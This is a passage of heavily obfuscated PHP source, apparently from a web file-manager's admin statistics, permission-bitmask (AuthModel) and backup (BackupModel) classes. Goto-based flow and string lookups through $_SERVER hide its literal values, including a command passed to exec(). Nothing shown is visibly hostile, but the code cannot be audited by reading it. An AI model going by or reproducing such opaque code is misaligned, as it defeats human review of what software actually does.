‚İ÷çöà, $Bµã•çÙÜ‚[1629] => (int) $C¿†²¶œ„Å, $Bµã•çÙÜ‚[1630] => $BÇæéÖ¶Ò); goto Eù¥ÂğÌÆÇ; AŒÀÏ…ì´Ô: $D™°ŞÊÜ¦ğ = intval($GLOBALS[$Bµã•çÙÜ‚[16]][$Bµã•çÙÜ‚[354]][$Bµã•çÙÜ‚[1464]]) / 3600; $c°Î¾‹Æ›‰ = strtotime("\x2d{$D™°ŞÊÜ¦ğ}\40\150\x6f\x75\162\x73"); $F„Ü‡ÑãÜ¦ = strtotime(date($Bµã•çÙÜ‚[1606])); goto DŒå¸°ÂŒ; d‘×‚—ŠŠ¥: if (!$BÇæéÖ¶Ò) { $BÇæéÖ¶Ò = 1; } $E‹ñƒ¥…Ú‚ = array($Bµã•çÙÜ‚[1626] => array($Bµã•çÙÜ‚[948], $F„Ü‡ÑãÜ¦)); $C¿†²¶œ„Å = Model($Bµã•çÙÜ‚[510])->where($E‹ñƒ¥…Ú‚)->count($Bµã•çÙÜ‚[1505]); goto FÂ¥šäÇï©; c¡½óµñº©: $Bµã•çÙÜ‚ =& $_SERVER[¾÷]; $AÍµ–’Şåğ = Model($Bµã•çÙÜ‚[510])->count($Bµã•çÙÜ‚[1505]); $B ‚İ÷çöà = Model($Bµã•çÙÜ‚[510])->where($Bµã•çÙÜ‚[1625])->count($Bµã•çÙÜ‚[1505]); goto AŒÀÏ…ì´Ô; DŒå¸°ÂŒ: if ($c°Î¾‹Æ›‰ < $F„Ü‡ÑãÜ¦) { $c°Î¾‹Æ›‰ = $F„Ü‡ÑãÜ¦; } $E‹ñƒ¥…Ú‚ = array($Bµã•çÙÜ‚[1626] => array($Bµã•çÙÜ‚[948], $c°Î¾‹Æ›‰)); $BÇæéÖ¶Ò = (int) Model($Bµã•çÙÜ‚[510])->where($E‹ñƒ¥…Ú‚)->count($Bµã•çÙÜ‚[1505]); goto d‘×‚—ŠŠ¥; Eù¥ÂğÌÆÇ: } private function optionFile() { goto aÑŞëÙ‰; B±ŞŒÅ¥õÇ: $BáÁ©ÃÓ¢Ñ = $cùª™—Óïö[$CÆÛ¢ë•‡[1599]]; $fùÈÈôÜÀ” = Model($CÆÛ¢ë•‡[776])->where(array($CÆÛ¢ë•‡[406] => 0))->count($CÆÛ¢ë•‡[399]); $B”ƒÏæÅ± = array($CÆÛ¢ë•‡[406] => 0, $CÆÛ¢ë•‡[202] => array($CÆÛ¢ë•‡[948], strtotime(date($CÆÛ¢ë•‡[1606])))); goto aŞ¯±Î¥õÀ; aŞ¯±Î¥õÀ: $D‡¬Ïë—È· = Model($CÆÛ¢ë•‡[776])->where($B”ƒÏæÅ±)->sum($CÆÛ¢ë•‡[87]); $Fˆš™¡óÀæ = Model($CÆÛ¢ë•‡[776])->where($B”ƒÏæÅ±)->count($CÆÛ¢ë•‡[399]); return array($CÆÛ¢ë•‡[720] => $Aí®èÅ˜, $CÆÛ¢ë•‡[1599] => $BáÁ©ÃÓ¢Ñ, $CÆÛ¢ë•‡[1631] => $Aí®èÅ˜ - $BáÁ©ÃÓ¢Ñ, $CÆÛ¢ë•‡[1632] => (int) $D‡¬Ïë—È·, $CÆÛ¢ë•‡[722] => (int) $fùÈÈôÜÀ”, $CÆÛ¢ë•‡[1633] => (int) $Fˆš™¡óÀæ); goto b¡¸²—ÍáÉ; aÑŞëÙ‰: $CÆÛ¢ë•‡ =& $_SERVER[¾÷]; $cùª™—Óïö = $this->sourceSize(); $Aí®èÅ˜ = $cùª™—Óïö[$CÆÛ¢ë•‡[87]]; goto B±ŞŒÅ¥õÇ; b¡¸²—ÍáÉ: } private function optionAccess() { $d¿ó¸Æ±² =& $_SERVER[¾÷]; return array($d¿ó¸Æ±²[717] => $this->typeLogCnt(), $d¿ó¸Æ±²[116] => $this->typeLogCnt($d¿ó¸Æ±²[116]), $d¿ó¸Æ±²[433] => $this->typeLogCnt($d¿ó¸Æ±²[433]), $d¿ó¸Æ±²[1634] => $this->typeLogCnt($d¿ó¸Æ±²[1634]), $d¿ó¸Æ±²[1635] => $this->typeLogCnt($d¿ó¸Æ±²[1635]), $d¿ó¸Æ±²[566] => $this->typeLogCnt($d¿ó¸Æ±²[43], $d¿ó¸Æ±²[1610])); } private function typeLogCnt($B‰êøˆÚÛŒ = '', $BÖ ë™„‘ = "\x69\x64") { goto b†Ó¶½öØ±; C‹ŠÉ‚‚¢: return (int) $a£ÙÖÆ£í™; goto c‰­ç³ìÂ»; b†Ó¶½öØ±: $Aº¼‰Ú¨÷Ë =& $_SERVER[¾÷]; $B„¶²¡ã‚ = array($Aº¼‰Ú¨÷Ë[116] => array($Aº¼‰Ú¨÷Ë[1636], $Aº¼‰Ú¨÷Ë[1637]), $Aº¼‰Ú¨÷Ë[433] => array($Aº¼‰Ú¨÷Ë[1638], $Aº¼‰Ú¨÷Ë[1639]), $Aº¼‰Ú¨÷Ë[1634] => array($Aº¼‰Ú¨÷Ë[1640], $Aº¼‰Ú¨÷Ë[1641], $Aº¼‰Ú¨÷Ë[1642]), $Aº¼‰Ú¨÷Ë[1635] => array($Aº¼‰Ú¨÷Ë[1643], $Aº¼‰Ú¨÷Ë[1644]), $Aº¼‰Ú¨÷Ë[1645] => array($Aº¼‰Ú¨÷Ë[1646], $Aº¼‰Ú¨÷Ë[1647], $Aº¼‰Ú¨÷Ë[1648])); $f½­ãÆÍÑ§ = strtotime(date($Aº¼‰Ú¨÷Ë[1606])); goto cÏ–¨±×Ø; cÏ–¨±×Ø: $D–Š‡­åè© = array($Aº¼‰Ú¨÷Ë[202] => array($Aº¼‰Ú¨÷Ë[948], $f½­ãÆÍÑ§)); if ($B‰êøˆÚÛŒ) { $D–Š‡­åè©[$Aº¼‰Ú¨÷Ë[39]] = array($Aº¼‰Ú¨÷Ë[17], $B„¶²¡ã‚[$B‰êøˆÚÛŒ]); } $a£ÙÖÆ£í™ = Model($Aº¼‰Ú¨÷Ë[1609])->where($D–Š‡­åè©)->count($BÖ ë™„‘); goto C‹ŠÉ‚‚¢; c‰­ç³ìÂ»: } private function optionServer() { goto E¶ë“–™º; aƒİ¢ğÉ…: return array($E‹§•ÙÔ[1651] => $aÃïèŒå»ø ? $aÃïèŒå»ø[$E‹§•ÙÔ[1652]] : 0, $E‹§•ÙÔ[1653] => $aÃïèŒå»ø ? $aÃïèŒå»ø[$E‹§•ÙÔ[1654]] : 0, $E‹§•ÙÔ[1655] => (int) $AĞˆºƒ•[$E‹§•ÙÔ[1652]] * 1024 * 1024 * 1024, $E‹§•ÙÔ[1656] => (int) $A„ÒÅ‡–§ø, $E‹§•ÙÔ[1657] => ucfirst($FœÊİª¤ ì), $E‹§•ÙÔ[1658] => $E‹§•ÙÔ[1659] . PHP_VERSION, $E‹§•ÙÔ[1660] => phpBuild64() ? 64 : 32, $E‹§•ÙÔ[716] => str_replace($E‹§•ÙÔ[1661], $E‹§•ÙÔ[925], $B‡Ã¡Ïß), $E‹§•ÙÔ[354] => ucfirst($c¢š½ä‡¬÷), $E‹§•ÙÔ[38] => $_SERVER[$E‹§•ÙÔ[1662]]); goto e§›Ä–¦‚ª; E¶ë“–™º: $E‹§•ÙÔ =& $_SERVER[¾÷]; $aÃïèŒå»ø = $this->diskDriver(); $AĞˆºƒ• = KodIO::defaultDriver(); goto a¢¥»ïö©; D‹çóÜ¯×‚: if ($B‡Ã¡Ïß == $E‹§•ÙÔ[747]) { $eğÓÊĞ¬‘÷ = explode($E‹§•ÙÔ[1141], $a‡× ‰…ƒ„[$E‹§•ÙÔ[908]]); $B‡Ã¡Ïß = $eğÓÊĞ¬‘÷[0]; } if ($B‡Ã¡Ïß == $E‹§•ÙÔ[750] || $B‡Ã¡Ïß == $E‹§•ÙÔ[751]) { $d†ï½ÁÜ¼ = Model()->db()->query($E‹§•ÙÔ[1649]); $E¢â¤ŒµÓç = $d†ï½ÁÜ¼[0] && isset($d†ï½ÁÜ¼[0][$E‹§•ÙÔ[1409]]) ? $d†ï½ÁÜ¼[0][$E‹§•ÙÔ[1409]] : 0; $B‡Ã¡Ïß = $E‹§•ÙÔ[1650] . ($E¢â¤ŒµÓç ? $E‹§•ÙÔ[18] . $E¢â¤ŒµÓç : $E‹§•ÙÔ[43]); } $c¢š½ä‡¬÷ = $GLOBALS[$E‹§•ÙÔ[16]][$E‹§•ÙÔ[354]][$E‹§•ÙÔ[778]]; goto aƒİ¢ğÉ…; a¢¥»ïö©: $B“öÈåÕ  = array($E‹§•ÙÔ[769] => $AĞˆºƒ•[$E‹§•ÙÔ[397]]); $A„ÒÅ‡–§ø = Model($E‹§•ÙÔ[453])->where($B“öÈåÕ )->sum($E‹§•ÙÔ[87]); $b“‰«£Ÿ«¸ = explode($E‹§•ÙÔ[60], $_SERVER[$E‹§•ÙÔ[151]]); goto eùœ­Ê×‚; eùœ­Ê×‚: $FœÊİª¤ ì = $b“‰«£Ÿ«¸[0]; $a‡× ‰…ƒ„ = $GLOBALS[$E‹§•ÙÔ[16]][$E‹§•ÙÔ[27]]; $B‡Ã¡Ïß = $a‡× ‰…ƒ„[$E‹§•ÙÔ[909]]; goto D‹çóÜ¯×‚; e§›Ä–¦‚ª: } private function diskDriver() { goto a¬ÈæÚˆÔ¾; fÑÆ‚™Ì±Â: $c­Ô²Éäóë = $f¬šïğçóĞ - @disk_free_space($E¦¶ëĞˆ—); return array($D‰ËĞòœ¢’[1652] => $f¬šïğçóĞ, $D‰ËĞòœ¢’[1654] => $c­Ô²Éäóë); goto eªåã…¦Ì; a¬ÈæÚˆÔ¾: $D‰ËĞòœ¢’ =& $_SERVER[¾÷]; $E¦¶ëĞˆ— = $D‰ËĞòœ¢’[18]; $C«ñ¼æ²å = $GLOBALS[$D‰ËĞòœ¢’[16]][$D‰ËĞòœ¢’[1663]] == $D‰ËĞòœ¢’[1664]; goto DêğŠ¬¿Ï; DêğŠ¬¿Ï: if ($C«ñ¼æ²å) { $E¦¶ëĞˆ— = $D‰ËĞòœ¢’[1665]; if (function_exists($D‰ËĞòœ¢’[1666])) { exec($D‰ËĞòœ¢’[1667], $dƒ©çõªÅ); $E¦¶ëĞˆ— = $dƒ©çõªÅ[1] . $D‰ËĞòœ¢’[18]; } } if (!file_exists($E¦¶ëĞˆ—)) { return; } $f¬šïğçóĞ = @disk_total_space($E¦¶ëĞˆ—); goto fÑÆ‚™Ì±Â; eªåã…¦Ì: } public function fileChart($fƒÛÏçİŒ) { goto a‰¾ë¿Ãéœ; a‰¾ë¿Ãéœ: $cÓ•’…ïªƒ =& $_SERVER[¾÷]; if (isset($fƒÛÏçİŒ[$cÓ•’…ïªƒ[1505]])) { return Model($cÓ•’…ïªƒ[776])->userFileTypeProfile($fƒÛÏçİŒ[$cÓ•’…ïªƒ[1505]]); } if (isset($fƒÛÏçİŒ[$cÓ•’…ïªƒ[1668]])) { return Model($cÓ•’…ïªƒ[776])->groupFileTypeProfile($fƒÛÏçİŒ[$cÓ•’…ïªƒ[1668]]); } goto EÑ ¿éåé; b®–Û˜¤Ğ˜: $fÒ÷£œŞ¹¤[$cÓ•’…ïªƒ[407]] = 2; $a°›Š‚³„ = Model($cÓ•’…ïªƒ[776])->where($fÒ÷£œŞ¹¤)->sum($cÓ•’…ïªƒ[87]); return array($cÓ•’…ïªƒ[720] => $FÌ´©›²¦ñ[$cÓ•’…ïªƒ[87]], $cÓ•’…ïªƒ[1599] => $FÌ´©›²¦ñ[$cÓ•’…ïªƒ[1599]], $cÓ•’…ïªƒ[1600] => (int) $A¹áãà½ê…, $cÓ•’…ïªƒ[1601] => (int) $a°›Š‚³„); goto Aô»è‡Ô‰Ú; EÑ ¿éåé: $FÌ´©›²¦ñ = $this->sourceSize(); $fÒ÷£œŞ¹¤ = array($cÓ•’…ïªƒ[481] => 0, $cÓ•’…ïªƒ[407] => 1); $A¹áãà½ê… = Model($cÓ•’…ïªƒ[776])->where($fÒ÷£œŞ¹¤)->sum($cÓ•’…ïªƒ[87]); goto b®–Û˜¤Ğ˜; Aô»è‡Ô‰Ú: } private function sourceSize() { $Dé÷¯õÉÉÖ =& $_SERVER[¾÷]; $DÃ¢¬›œË = Model($Dé÷¯õÉÉÖ[776])->where(array($Dé÷¯õÉÉÖ[406] => 0))->sum($Dé÷¯õÉÉÖ[87]); $aàˆ³ÒãŠ‚ = Model($Dé÷¯õÉÉÖ[453])->sum($Dé÷¯õÉÉÖ[87]); if ($aàˆ³ÒãŠ‚ > $DÃ¢¬›œË) { $aàˆ³ÒãŠ‚ = $DÃ¢¬›œË; } return array($Dé÷¯õÉÉÖ[87] => (int) $DÃ¢¬›œË, $Dé÷¯õÉÉÖ[1599] => (int) $aàˆ³ÒãŠ‚); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $b®‡¡—áŸ =& $_SERVER[¾÷]; $eŸ†”ÄÙß” = array(array($b®‡¡—áŸ[416] => LNG($b®‡¡—áŸ[1669]), $b®‡¡—áŸ[1670] => $b®‡¡—áŸ[1671], $b®‡¡—áŸ[1672] => 1, $b®‡¡—áŸ[1673] => 1, $b®‡¡—áŸ[1674] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($b®‡¡—áŸ[416] => LNG($b®‡¡—áŸ[1675]), $b®‡¡—áŸ[1670] => $b®‡¡—áŸ[1676], $b®‡¡—áŸ[1672] => 2, $b®‡¡—áŸ[1673] => 1, $b®‡¡—áŸ[1674] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($b®‡¡—áŸ[416] => LNG($b®‡¡—áŸ[1677]), $b®‡¡—áŸ[1670] => $b®‡¡—áŸ[1678], $b®‡¡—áŸ[1672] => 3, $b®‡¡—áŸ[1673] => 1, $b®‡¡—áŸ[1674] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($b®‡¡—áŸ[416] => LNG($b®‡¡—áŸ[1679]), $b®‡¡—áŸ[1670] => $b®‡¡—áŸ[1680], $b®‡¡—áŸ[1672] => 4, $b®‡¡—áŸ[1673] => 1, $b®‡¡—áŸ[1674] => self::AUTH_SHOW | self::AUTH_VIEW), array($b®‡¡—áŸ[416] => LNG($b®‡¡—áŸ[1681]), $b®‡¡—áŸ[1670] => $b®‡¡—áŸ[1682], $b®‡¡—áŸ[1672] => 5, $b®‡¡—áŸ[1673] => 1, $b®‡¡—áŸ[1674] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($b®‡¡—áŸ[416] => LNG($b®‡¡—áŸ[1683]), $b®‡¡—áŸ[1670] => $b®‡¡—áŸ[1684], $b®‡¡—áŸ[1672] => 6, $b®‡¡—áŸ[1673] => 1, $b®‡¡—áŸ[1674] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($b®‡¡—áŸ[416] => LNG($b®‡¡—áŸ[1685]), $b®‡¡—áŸ[1670] => $b®‡¡—áŸ[1686], $b®‡¡—áŸ[1672] => 7, $b®‡¡—áŸ[1673] => 1, $b®‡¡—áŸ[1674] => 0)); return $eŸ†”ÄÙß”; } public static function authCheck($BŒ³­–…ø, $dë¿ÅÎçñ) { $BŒ³­–…ø = intval($BŒ³­–…ø); if ($GLOBALS[$_SERVER[¾÷][488]]) { return !0; } if ($BŒ³­–…ø <= 0) { return !1; } if (($BŒ³­–…ø & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($BŒ³­–…ø & $dë¿ÅÎçñ); } public static function authCheckShow($eöö¼»ƒË¹) { return self::authCheck($eöö¼»ƒË¹, self::AUTH_SHOW); } public static function authCheckView($fÑõÆâ—ôĞ) { return self::authCheck($fÑõÆâ—ôĞ, self::AUTH_VIEW); } public static function authCheckDownload($cÓ‹Â˜¶) { return self::authCheck($cÓ‹Â˜¶, self::AUTH_DOWNLOAD); } public static function authCheckUpload($aÂ’¡ÂÛˆõ) { return self::authCheck($aÂ’¡ÂÛˆõ, self::AUTH_UPLOAD); } public static function authCheckEdit($fë”ÇŒÓ¬£) { return self::authCheck($fë”ÇŒÓ¬£, self::AUTH_EDIT); } public static function authCheckRemove($EÏåöç„÷) { return self::authCheck($EÏåöç„÷, self::AUTH_REMOVE); } public static function authCheckShare($Cá®£š¸) { return self::authCheck($Cá®£š¸, self::AUTH_SHARE); } public static function authCheckComment($Dºª¯ÑƒÈÒ) { return self::authCheck($Dºª¯ÑƒÈÒ, self::AUTH_COMMENT); } public static function authCheckEvent($CÚ†±Ù—¶Œ) { return self::authCheck($CÚ†±Ù—¶Œ, self::AUTH_EVENT); } public static function authCheckRoot($D¨î²Õ¥Ûï) { return self::authCheck($D¨î²Õ¥Ûï, self::AUTH_ROOT); } public static function authCheckAction($AÀæ¬÷¾ôİ, $cÊÊæ“ƒ­) { goto C¢Ç½ªïªà; f–”£éÖœ: if (($AÀæ¬÷¾ôİ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($AÀæ¬÷¾ôİ & $dçÛö‡¬¬Ä); goto cƒ¥ºç…­É; C¢Ç½ªïªà: $eÚ…Â‚…¿´ =& $_SERVER[¾÷]; $FÎ²™«¤Ëº = array($eÚ…Â‚…¿´[1687] => self::AUTH_VIEW, $eÚ…Â‚…¿´[1070] => self::AUTH_DOWNLOAD, $eÚ…Â‚…¿´[116] => self::AUTH_UPLOAD, $eÚ…Â‚…¿´[1635] => self::AUTH_EDIT, $eÚ…Â‚…¿´[1634] => self::AUTH_REMOVE, $eÚ…Â‚…¿´[1645] => self::AUTH_SHARE, $eÚ…Â‚…¿´[359] => self::AUTH_COMMENT, $eÚ…Â‚…¿´[1494] => self::AUTH_EVENT, $eÚ…Â‚…¿´[1688] => self::AUTH_ROOT); if (!isset($FÎ²™«¤Ëº[$cÊÊæ“ƒ­])) { return; } goto BÀ‰¼µŒ†Ï; BÀ‰¼µŒ†Ï: $dçÛö‡¬¬Ä = $FÎ²™«¤Ëº[$cÊÊæ“ƒ­]; $AÀæ¬÷¾ôİ = intval($AÀæ¬÷¾ôİ); if ($AÀæ¬÷¾ôİ <= 0) { return !1; } goto f–”£éÖœ; cƒ¥ºç…­É: } public static function authDisable($f¤Ï‹¡ƒŠİ, $eò¦ß¾³®) { if (intval($f¤Ï‹¡ƒŠİ) <= 0) { return 0; } return intval($f¤Ï‹¡ƒŠİ) & ~$eò¦ß¾³®; } public $optionType = "\123\x79\x73\164\x65\155\56\x73\157\165\162\143\x65\101\165\x74\150\x4c\x69\163\x74"; public $field = array("\156\141\155\x65", "\141\x75\x74\150", "\154\141\142\x65\x6c", "\144\x69\x73\x70\x6c\x61\x79", "\163\x79\163\164\145\155", "\x73\x6f\x72\x74"); public function initData() { $B®Š¨°òªÌ = $this->authDefault(); foreach ($B®Š¨°òªÌ as $e£œÃØÚÉ) { $this->add($e£œÃØÚÉ); } } public function listData($c›ñ¼‰‰êÁ = false, $FÆÏ¨º‘õ = "\x73\x6f\x72\x74", $a†¬­’Óø = false) { return parent::listData($c›ñ¼‰‰êÁ, $FÆÏ¨º‘õ, $a†¬­’Óø); } public function update($dºäÎ£Œê, $aª¡—õÅ¯Æ) { $F£ó…×–Öí =& $_SERVER[¾÷]; $DêøÏğ§Œ = parent::listData($dºäÎ£Œê); $d²Áöƒ±«ö = $this->findByName($aª¡—õÅ¯Æ[$F£ó…×–Öí[38]]); if (!$DêøÏğ§Œ || $d²Áöƒ±«ö && $d²Áöƒ±«ö[$F£ó…×–Öí[397]] != $DêøÏğ§Œ[$F£ó…×–Öí[397]]) { return !1; } $this->filterAuth($aª¡—õÅ¯Æ[$F£ó…×–Öí[409]]); return parent::update($dºäÎ£Œê, $aª¡—õÅ¯Æ); } public function remove($eØŠÂÙ£•) { $a±ÚµÊç¼¨ = parent::listData($eØŠÂÙ£•); if (!$a±ÚµÊç¼¨ || $a±ÚµÊç¼¨[$_SERVER[¾÷][1145]]) { return !1; } return parent::remove($eØŠÂÙ£•); } public function add($dÎÅÅ²†á¹ = array()) { goto B¹ÓŠÄ·®‡; e´ùÂÄƒ: return parent::insert($dÎÅÅ²†á¹); goto a‡¨“Œàó; B¹ÓŠÄ·®‡: $C‘‹œùÒ‚ù =& $_SERVER[¾÷]; if ($this->findByName($dÎÅÅ²†á¹[$C‘‹œùÒ‚ù[38]])) { return !1; } $C»áõŒğ = array($C‘‹œùÒ‚ù[38] => $C‘‹œùÒ‚ù[43], $C‘‹œùÒ‚ù[409] => 1, $C‘‹œùÒ‚ù[1689] => $C‘‹œùÒ‚ù[1678], $C‘‹œùÒ‚ù[1690] => 1, $C‘‹œùÒ‚ù[1145] => 0, $C‘‹œùÒ‚ù[1691] => 0); goto Dï·äğ‡°¬; Dï·äğ‡°¬: $dÎÅÅ²†á¹ = array_merge($C»áõŒğ, $dÎÅÅ²†á¹); $dÎÅÅ²†á¹[$C‘‹œùÒ‚ù[1691]] = $this->getSort(); $this->filterAuth($dÎÅÅ²†á¹[$C‘‹œùÒ‚ù[409]]); goto e´ùÂÄƒ; a‡¨“Œàó: } private function getSort() { $AîÏ‡ÓŞŒ˜ =& $_SERVER[¾÷]; $Aö•ò°ëÔÑ = parent::listData(); $b¯‰·À™¸´ = array_to_keyvalue($Aö•ò°ëÔÑ, $AîÏ‡ÓŞŒ˜[43], $AîÏ‡ÓŞŒ˜[1691]); return empty($b¯‰·À™¸´) ? 0 : max($b¯‰·À™¸´) + 1; } private function filterAuth(&$C­«Œ¹Úí) { goto E×‡ïŸ—ì; cŸ‚Ÿºï‡î: foreach ($A°´æ½º as $Cäİá¾ è) { if ($C­«Œ¹Úí & $Cäİá¾ è) { $e¥ÍŞ…õ¡©[] = $Cäİá¾ è; } } if (in_array(self::AUTH_ROOT, $e¥ÍŞ…õ¡©)) { $C­«Œ¹Úí = array_sum($A°´æ½º); return; } $BãÄÙ¹ªŒË = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto DßÎËÈ‘; DßÎËÈ‘: foreach ($e¥ÍŞ…õ¡© as $Cäİá¾ è) { if (isset($BãÄÙ¹ªŒË[$Cäİá¾ è])) { $e¥ÍŞ…õ¡© = array_merge($e¥ÍŞ…õ¡©, $BãÄÙ¹ªŒË[$Cäİá¾ è]); } } $e¥ÍŞ…õ¡©[] = self::AUTH_SHOW; $C­«Œ¹Úí = array_sum(array_unique($e¥ÍŞ…õ¡©)); goto cÓÛ‘È¯Ï‚; E×‡ïŸ—ì: if (!$C­«Œ¹Úí) { return; } $A°´æ½º = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $e¥ÍŞ…õ¡© = array(); goto cŸ‚Ÿºï‡î; cÓÛ‘È¯Ï‚: } public function sort($BÈ¿£Éé³‹, $eßÒà¾˜Î) { return parent::update($BÈ¿£Éé³‹, $eßÒà¾˜Î); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\x62\141\143\x6b\165\160\x4c\151\163\164"; public $field = array("\x69\x6f", "\156\141\x6d\x65", "\163\164\x61\x74\165\163", "\143\x6f\x6e\164\x65\156\x74", "\162\x65\163\x75\154\x74", "\x74\x69\x6d\x65\x46\x72\x6f\x6d", "\x74\x69\x6d\x65\124\x6f"); public function config() { goto EÄ®à¦ˆÛ; DÉó»…–¯¬: if (isset($DŒƒß³©‹ê[$EŸêíë§[205]])) { $DŒƒß³©‹ê[$EŸêíë§[205]] = json_decode($DŒƒß³©‹ê[$EŸêíë§[205]], !0); } if (isset($EòŒ˜‡‘‰»[$EŸêíë§[205]])) { $DŒƒß³©‹ê[$EŸêíë§[205]][$EŸêíë§[1479]] = $EòŒ˜‡‘‰»[$EŸêíë§[205]]; unset($EòŒ˜‡‘‰»[$EŸêíë§[205]]); } return array_merge($DŒƒß³©‹ê, $EòŒ˜‡‘‰»); goto dĞ‹óß£¹Ï; BÓÎŸ ŠøÂ: Action($EŸêíë§[1692])->taskInit(); $b‰–×êÁ = Model($EŸêíë§[1693])->listData(); foreach ($b‰–×êÁ as $c±„¶é–) { if ($c±„¶é–[$EŸêíë§[1145]] == $EŸêíë§[96] && $c±„¶é–[$EŸêíë§[1494]] == $EŸêíë§[1694]) { $DŒƒß³©‹ê = $c±„¶é–; break; } } goto DÉó»…–¯¬; EÄ®à¦ˆÛ: $EŸêíë§ =& $_SERVER[¾÷]; $EòŒ˜‡‘‰» = Model($EŸêíë§[1100])->get($EŸêíë§[735]); $EòŒ˜‡‘‰» = json_decode($EòŒ˜‡‘‰», !0); goto B‰‡Ê»°ƒ; B‰‡Ê»°ƒ: $EòŒ˜‡‘‰» = is_array($EòŒ˜‡‘‰») ? $EòŒ˜‡‘‰» : array(); if (!isset($EòŒ˜‡‘‰»[$EŸêíë§[714]])) { $EòŒ˜‡‘‰»[$EŸêíë§[714]] = $EŸêíë§[96]; } $DŒƒß³©‹ê = array(); goto BÓÎŸ ŠøÂ; dĞ‹óß£¹Ï: } public function listData($D´¦½ØãÀ‚ = false, $eÛïŠßŒ‘¾ = "\x6d\157\144\x69\x66\x79\x54\x69\x6d\145", $DÃƒİ´ªàÆ = false) { return parent::listData($D´¦½ØãÀ‚, $eÛïŠßŒ‘¾, !0); } public function lastItem() { $eÃ¶‘Øƒ¾ƒ = $this->listData(); return !empty($eÃ¶‘Øƒ¾ƒ[0]) ? $eÃ¶‘Øƒ¾ƒ[0] : null; } public function kill($e‹Œ àøéŠ) { goto bóß³¼’µ©; FÛ¸Ö×¾¨: return $this->remove($e‹Œ àøéŠ); goto eâ´‹‚§Ä; eŞˆìÚêœ: Task::kill($ağª¶ÍØæØ[734]); Task::kill($ağª¶ÍØæØ[753]); Task::kill($ağª¶ÍØæØ[762]); goto Bì¡ÅâôÈŞ; bóß³¼’µ©: $ağª¶ÍØæØ =& $_SERVER[¾÷]; $eÒ¦ÁÎ­ê¿ = $this->listData($e‹Œ àøéŠ); if (!$eÒ¦ÁÎ­ê¿ || empty($eÒ¦ÁÎ­ê¿[$ağª¶ÍØæØ[38]])) { return !0; } goto eŞˆìÚêœ; Bì¡ÅâôÈŞ: $dÎõéÛùøµ = $eÒ¦ÁÎ­ê¿[$ağª¶ÍØæØ[38]]; $EğÓ‚‘¤ÊÂ = TEMP_FILES . $ağª¶ÍØæØ[731] . $dÎõéÛùøµ . $ağª¶ÍØæØ[18]; IO::remove($EğÓ‚‘¤ÊÂ, !1); goto FÛ¸Ö×¾¨; eâ´‹‚§Ä: } public function remove($bÔ´è†É´À) { $A½ôšƒ‰äŞ = $this->listData($bÔ´è†É´À); if (!$A½ôšƒ‰äŞ) { return !0; } return $this->backupRemove($A½ôšƒ‰äŞ); } private function backupRemove($dÛ¸—ñ¢ç„) { $e¼‘›¨Ì =& $_SERVER[¾÷]; parent::remove($dÛ¸—ñ¢ç„[$e¼‘›¨Ì[397]]); $e¼‚åª”´ˆ = "\x7b\151\157\72{$dÛ¸—ñ¢ç„[$e¼‘›¨Ì[713]]}\x7d\57\144\141\164\141\x62\x61\163\145\57\x62\141\x63\153\x75\x70\137" . $dÛ¸—ñ¢ç„[$e¼‘›¨Ì[38]]; IO::remove($e¼‚åª”´ˆ, !1); return !0; } public function start() { goto CøÏÔõ‚ùÛ; A¨°Ã†˜Øƒ: if ($f‘Ğ¹Š—Ä) { $f‘Ğ¹Š—Ä = $aÖªùİ¸->dbFile(); if ($f‘Ğ¹Š—Ä && $E×Îå§ìƒ[$A…§˜¾°[714]] == $A…§˜¾°[500]) { $f‘Ğ¹Š—Ä = $aÖªùİ¸->file(); } } Backup::set(array($A…§˜¾°[711] => 1, $A…§˜¾°[479] => time())); return !0; goto eœõŸáùŒÚ; CøÏÔõ‚ùÛ: $A…§˜¾° =& $_SERVER[¾÷]; if ($GLOBALS[$A…§˜¾°[16]][$A…§˜¾°[97]][$A…§˜¾°[1695]] != $A…§˜¾°[96]) { return !0; } $E×Îå§ìƒ = $this->config(); goto b‚Å”ê¿; b‚Å”ê¿: if (!$E×Îå§ìƒ || $E×Îå§ìƒ[$A…§˜¾°[1476]] != $A…§˜¾°[96]) { return !1; } $DÇî¸šŸö² = $this->process(); foreach ($DÇî¸šŸö² as $dÃ«Ñæ¾ÓÉ) { if ($dÃ«Ñæ¾ÓÉ) { return Task::restart($dÃ«Ñæ¾ÓÉ[$A…§˜¾°[397]]); } } goto AàËµà—¿¸; AàËµà—¿¸: 